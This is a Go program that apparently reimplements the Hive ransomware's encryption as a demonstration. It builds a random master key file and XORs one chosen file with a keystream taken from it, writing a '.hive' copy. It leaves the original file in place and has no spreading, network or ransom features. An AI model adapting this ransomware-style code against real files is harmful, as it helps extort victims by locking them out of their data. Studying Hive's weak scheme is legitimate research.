package main

import (
  "fmt"
  "crypto/rand"
  "math/big"
  "os"
  "io/ioutil"
  "encoding/hex"
  "strconv"
)

const (
  masterKeyName = "MASTERKEY.hive"
  masterKeySize = 0xA00000
  keyLength = 0x100000
)

var (
  masterKey []byte
  eks []byte
  fileToEncrypt string
  keyFile string
)

func generateMasterKey() error {
  fmt.Printf("\rGenerating master key file...\n")
  for i := 0; i < masterKeySize; i++ {
    n, err := rand.Int(rand.Reader, big.NewInt(16))
    if err != nil {
      return fmt.Errorf("Couldn't gen number")
    } else {
      masterKey = n.Append(masterKey, 16)
    }
  }
  err := os.WriteFile(masterKeyName, masterKey, 0644)
  if err != nil {
    return fmt.Errorf("could not write master key file: %w", err)
  }
  fmt.Printf("Master key file written!\n")

  return nil
}

func getOffsets(fileName string) error {
  masterKeyFile, err := ioutil.ReadFile(fileName)
  if err != nil {
    fmt.Println("could not open master key file")
    return err
  }

  hexString := hex.EncodeToString(masterKeyFile[:4])
  r1, err := strconv.ParseInt(hexString, 16, 32)

  sp1 := r1 % 0x900000

  eks = masterKeyFile[sp1:(sp1 + keyLength)]
  fmt.Printf("\nGrabbing key 1 from 0x%x\n", sp1)

  return nil
}

func encryptThisFileBaby(oldFile []byte, fileName string) error {
  var newFile = make([]byte, len(oldFile))
  fmt.Printf("Maliciously encrypting %s...\n", fileName)
  for i := range oldFile {
    newFile[i] = oldFile[i] ^ eks[i % keyLength]
  }
  fmt.Printf("Your file has been \"irreversibly\" encrypted!\n")

  err := os.WriteFile(fileName + ".hive", newFile, 0644)
  if err != nil {
    return fmt.Errorf("failed to write file: %w", err)
  }

  return nil
}

func usage() {
  fmt.Printf("Usage: %s [-g | -k <master key> -f file1]\n", os.Args[0])
  fmt.Printf("\t-g                   - Generate new master key file\n")
  fmt.Printf("\t-k <key>             - Master key file to encrypt data\n")
  fmt.Printf("\t-f <file to encrypt> - File to be encrypted\n")
}

func main() {
  if len(os.Args) < 2 {
    usage()
    os.Exit(1)
  } else if ( os.Args[1] != "-g" && os.Args[1] != "-k" && os.Args[1] != "-f" ) {
    usage()
    os.Exit(1)
  }

  for ind, arg := range os.Args {
    if arg == "-g" {
      err := generateMasterKey()
      if err != nil {
        os.Exit(1)
      }

      return
    }

    if arg == "-k" || arg == "-f" {
      if arg == "-k" {
        keyFile = os.Args[ind + 1]
      } else {
        fileToEncrypt = os.Args[ind + 1]
      }
    }
  }

  if keyFile == "" || fileToEncrypt == "" {
    fmt.Printf("Must use -k <key> and -f <file> together\n") 
    os.Exit(1)
  }

  err := getOffsets(keyFile)
  if err != nil {
    fmt.Printf("failed to get offsets: %w", err)
    os.Exit(1)
  }

  oldFileBuf, err := ioutil.ReadFile(fileToEncrypt)
  if err != nil {
    fmt.Errorf("failed to read file into byte array: %w", err)
    os.Exit(1)
  }

  encryptThisFileBaby(oldFileBuf, fileToEncrypt)
}
